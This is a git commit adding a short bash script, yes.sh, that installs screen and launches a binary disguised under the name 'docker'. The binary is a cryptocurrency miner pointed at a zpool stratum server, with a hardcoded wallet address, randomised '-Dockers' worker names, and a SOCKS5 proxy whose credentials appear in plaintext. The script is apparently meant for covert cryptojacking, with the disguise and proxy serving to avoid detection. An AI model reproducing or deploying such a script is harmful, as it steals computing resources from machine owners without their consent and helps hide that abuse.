b0750d38072f0fd9d8e550c9e149d89a305b5333
keratsakti <86237834+keratsakti@users.noreply.github.com>
2021-06-24 21:20:16 +0700

    Create yes.sh

---
+++ yes.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+sudo apt update 
+sudo apt install screen libjansson4 -y 
+chmod +x docker 
+screen -dmS ls 
+POOL=stratum+tcp://cpupower.na.mine.zpool.ca:6240
+WALLET=D786Q59xzNpTfyewB9mFZjYTHJKs2zE8zV
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Dockers)
+PROXY=socks5://cuan:berhasil123@199.249.170.113:443
+./docker -a verus -o $POOL -u $WALLET.$WORKER -p c=LTC,zap=VRSC -t 2 -x $PROXY
